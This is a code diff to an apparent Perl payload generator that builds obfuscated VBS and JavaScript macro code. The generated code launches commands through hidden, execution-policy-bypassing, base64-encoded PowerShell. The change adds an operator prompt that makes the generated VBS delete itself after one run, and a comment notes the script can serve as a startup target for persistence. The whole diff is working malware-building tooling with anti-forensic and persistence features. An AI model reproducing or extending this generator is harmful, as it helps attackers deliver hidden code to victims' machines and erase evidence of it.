@@ -105,6 +105,49 @@ sub set_type {
 	return $type;
 } 
 
+#######[ Self Delete VBS Script? ]#####################
+#
+# Gives you the option to have the script persist, for example if you decide to use it as
+# a startup target.
+#
+
+sub self_delete {
+
+        my $opt;
+        my $choice;
+        my $selfdelete;
+
+        print "[*] Do you wish to have your VBS delete itself after running once?\n\n";
+        print "[Y]-> Yes\n";
+        print "[N]-> No\n\n";
+
+        while (1) {
+
+                print "[*] Please enter (Y/N)\n";
+                $opt = <STDIN>;
+                chomp($opt);
+
+                if ($opt =~ /y/i or $opt =~ /yes/i ) {
+                        print "[+] VBS script will self-delete after the first execution.\n";
+                        $choice = 'true';
+                        last;
+                }
+                elsif ($opt =~ /n/i or $opt =~ /no/i ) {
+                        print "[!] VBS script will remain until manually deleted.\n";
+                        $choice = 'false';
+                        last;
+                }
+                else {  print "[*] Input not understood, re-enter option.\n"; }
+
+        }
+
+	if ($choice eq 'true' ) { $selfdelete = '1'; } else { $selfdelete = '0'; }
+
+        return $selfdelete;
+
+}
+
+
 #######[ Encode Your IEX? ]#############################
 #
 # base64 encoding in Powershell, set to false if you already have a base64 encoded payload or 
@@ -205,6 +248,7 @@ sub gen_code {
 
         my @chars = split("", $_[0]);
 	my $stype = $_[1];
+	my $selfdelete = $_[2];
         my $cnt = 1;
         my @rvars;
 
@@ -446,9 +490,17 @@ sub gen_code {
 
                 if ( $stype eq 1 ) {
 
-                        print $fh "\n", 'set ' . $robjfso . ' = ' . 'CreateObject("Scripting.FileSystemObject")';
-                        if ( $rspace == 0 ) { print $fh "\n"; }
-                        print $fh "\n", $robjfso . '.DeleteFile ' . 'Wscript.ScriptFullName';
+			# add option to self-delete or NOT self-delete
+
+			if ( $selfdelete eq 1 ) 
+			{ 
+
+                      		print $fh "\n", 'set ' . $robjfso . ' = ' . 'CreateObject("Scripting.FileSystemObject")';
+                        	if ( $rspace == 0 ) { print $fh "\n"; }
+                        	print $fh "\n", $robjfso . '.DeleteFile ' . 'Wscript.ScriptFullName';
+			
+			}
+
                         if ( $rspace == 1 ) { print "\n"; }
                         print $fh "\n", 'End Function';
                         print $fh "\n", $rfunc;
@@ -535,6 +587,10 @@ sub js_macro {
 sub main {
 
 	my $stype = set_type();
+	
+	my $selfdelete;
+	if ($stype == 1 ) { $selfdelete = self_delete(); } 
+
 	my $use_encoding = set_encoding();
 	my $script = 'code-output';
 
@@ -550,7 +606,7 @@ sub main {
 		# Passing an empty string to encode_base64 to prevent any newlines
 		my $encdcmd = encode_base64($utf16le, '');
 		my $base64cmd = 'cmd.exe /c powershell.exe -ep bypass -noni -w hidden -enc' . ' ' . $encdcmd;
-		my $rsub = gen_code($base64cmd, $stype);
+		my $rsub = gen_code($base64cmd, $stype, $selfdelete);
 
 		if ($stype == 4 ) { js_macro($rsub); unlink $script; $script = 'js-code-output';  } 
 
@@ -560,7 +616,7 @@ sub main {
         	print '[>] c:\users\some-user\> [ your command you wish to run ]' . "\n";
 
 		my $cmd = get_cmd();
-        	my $rsub = gen_code($cmd, $stype); 
+        	my $rsub = gen_code($cmd, $stype, $selfdelete); 
 
 		if ($stype == 4 ) { js_macro($rsub); unlink $script; $script = 'js-code-output'; } 
 		
